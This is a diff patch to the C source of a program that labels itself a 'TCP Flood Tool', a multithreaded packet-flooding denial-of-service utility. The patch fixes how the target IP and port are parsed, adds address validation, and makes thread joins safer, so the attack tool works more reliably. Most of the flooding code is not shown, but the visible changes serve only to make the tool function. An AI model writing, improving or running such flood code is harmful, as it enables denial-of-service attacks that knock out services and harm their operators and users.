@@ -1,4 +1,4 @@
-/* 
+/*
  * TCP Flood Tool - Optimized Version
  * Improved code structure and performance
  */
@@ -20,6 +20,7 @@
 #include <sys/types.h>
 #include <time.h>
 #include <unistd.h>
+#include <stdint.h>  // Añadido para uint32_t
 
 #define MAX_PACKET_SIZE 4096
 #define PHI 0x9e3779b9
@@ -109,11 +110,11 @@ uint32_t get_external_address(void) {
         return INADDR_ANY;
     }
     
-    struct sockaddr_in addr = {
-        .sin_family = AF_INET,
-        .sin_addr.s_addr = inet_addr("8.8.8.8"),
-        .sin_port = htons(53)
-    };
+    struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = inet_addr("8.8.8.8");
+    addr.sin_port = htons(53);
     
     if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
         perror("connect() failed");
@@ -252,12 +253,33 @@ void send_packet(int sockfd, const struct sockaddr_in *target,
 void *flood_thread(void *arg) {
     thread_data_t *data = (thread_data_t *)arg;
     
+    // Parse target IP and port from the string
+    char target_ip[16];
+    unsigned short target_port;
+    char *colon = strchr(data->target_ip, ':');
+    
+    if (colon) {
+        strncpy(target_ip, data->target_ip, colon - data->target_ip);
+        target_ip[colon - data->target_ip] = '\0';
+        target_port = atoi(colon + 1);
+    } else {
+        strcpy(target_ip, data->target_ip);
+        target_port = 80;  // Default port
+    }
+    
     // Setup target address
     struct sockaddr_in target;
     memset(&target, 0, sizeof(target));
     target.sin_family = AF_INET;
-    target.sin_addr.s_addr = inet_addr(data->target_ip);
-    target.sin_port = htons(atoi(data->target_ip + strlen(data->target_ip) + 1));
+    target.sin_addr.s_addr = inet_addr(target_ip);
+    target.sin_port = htons(target_port);
+    
+    // Validate target address
+    if (target.sin_addr.s_addr == INADDR_NONE) {
+        fprintf(stderr, "Thread %d: Invalid target IP address\n", data->thread_id);
+        free(data);
+        pthread_exit(NULL);
+    }
     
     // Get source IP and create socket
     uint32_t source_ip = get_external_address();
@@ -381,10 +403,14 @@ int main(int argc, char *argv[]) {
     
     // Wait for threads to finish
     for (unsigned int i = 0; i < config.threads; i++) {
-        pthread_join(threads[i], NULL);
+        if (threads[i] != 0) {
+            pthread_join(threads[i], NULL);
+        }
     }
     
-    pthread_join(stats_thread, NULL);
+    if (stats_thread != 0) {
+        pthread_join(stats_thread, NULL);
+    }
     
     free(threads);
     pthread_mutex_destroy(&stats_mutex);
